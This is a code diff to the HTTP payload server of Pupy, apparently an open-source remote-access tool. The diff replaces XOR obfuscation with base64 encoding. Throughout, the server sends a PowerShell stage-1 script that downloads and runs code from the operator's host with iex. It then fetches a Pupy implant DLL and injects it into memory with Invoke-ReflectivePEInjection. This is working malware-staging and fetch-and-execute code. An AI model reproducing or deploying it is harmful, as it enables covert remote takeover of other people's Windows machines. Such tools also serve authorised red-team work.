@@ -19,9 +19,16 @@ def ps1_encode(s):
 def ps1_decode():
     return 
 
-def xor_bytes(b, key=0x42):
-    return ''.join([chr(ord(x)^key) for x in b])
-
+def obfsucate_bytes(b, key):
+    return base64.b64encode(b)
+    #return ''.join([chr(ord(x)^key) for x in b])
+"""
+    powershell xor is too slow in big buffers
+            for($i=0; $i -lt $rpi.count ; $i++)
+            {
+                $rpi[$i] = $rpi[$i] -bxor %s
+            }
+"""
 class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path=="/p":
@@ -30,20 +37,12 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.end_headers()
             pe_bootloader=(textwrap.dedent("""
             $rpi=[System.Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString("http://%s:%s/rpi"))
-            for($i=0; $i -lt $rpi.count ; $i++)
-            {
-                $rpi[$i] = $rpi[$i] -bxor %s
-            }
             iex([System.Text.Encoding]::UTF8.GetString($rpi))
             $path="b64"
             if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8){$path="b32"}
-            [Byte[]]$b=(New-Object System.Net.WebClient).DownloadData("http://%s:%s/"+$path)
-            for($i=0; $i -lt $b.count ; $i++)
-            {
-                $b[$i] = $b[$i] -bxor %s
-            }
+            [Byte[]]$b=[System.Convert]::FromBase64String((New-Object System.Net.WebClient).DownloadString("http://%s:%s/"+$path))
             Invoke-ReflectivePEInjection -ForceASLR -PEBytes $b -Verbose
-            """%(self.server.link_ip, self.server.link_port, hex(self.server.xor_key), self.server.link_ip, self.server.link_port, hex(self.server.xor_key))))
+            """%(self.server.link_ip, self.server.link_port, self.server.link_ip, self.server.link_port)))
             self.wfile.write(pe_bootloader)
             print colorize("[+] ","green")+" powershell script stage1 served !"
 
@@ -53,7 +52,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type','text/html')
             self.end_headers()
             code=open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")).read()
-            self.wfile.write(base64.b64encode(xor_bytes(code, self.server.xor_key)))
+            self.wfile.write(obfsucate_bytes(code, self.server.xor_key))
             print colorize("[+] ","green")+" powershell Invoke-ReflectivePEInjection.ps1 script served !"
         elif self.path=="/b32":
             #serve the pupy 32bits dll to load from memory
@@ -61,7 +60,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type','application/octet-stream')
             self.end_headers()
             print colorize("[+] ","green")+" generating x86 reflective dll ..."
-            self.wfile.write(xor_bytes(get_edit_pupyx86_dll(self.server.payload_conf)), self.server.xor_key)
+            self.wfile.write(obfsucate_bytes(get_edit_pupyx86_dll(self.server.payload_conf), self.server.xor_key), self.server.xor_key)
             print colorize("[+] ","green")+" pupy x86 reflective dll served !"
         elif self.path=="/b64":
             #serve the pupy 64bits dll to load from memory
@@ -69,7 +68,7 @@ class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
             self.send_header('Content-type','application/octet-stream')
             self.end_headers()
             print colorize("[+] ","green")+" generating amd64 reflective dll ..."
-            self.wfile.write(xor_bytes(get_edit_pupyx64_dll(self.server.payload_conf), self.server.xor_key))
+            self.wfile.write(obfsucate_bytes(get_edit_pupyx64_dll(self.server.payload_conf), self.server.xor_key))
             print colorize("[+] ","green")+" pupy amd64 reflective dll served !"
         else:
             self.send_response(404)
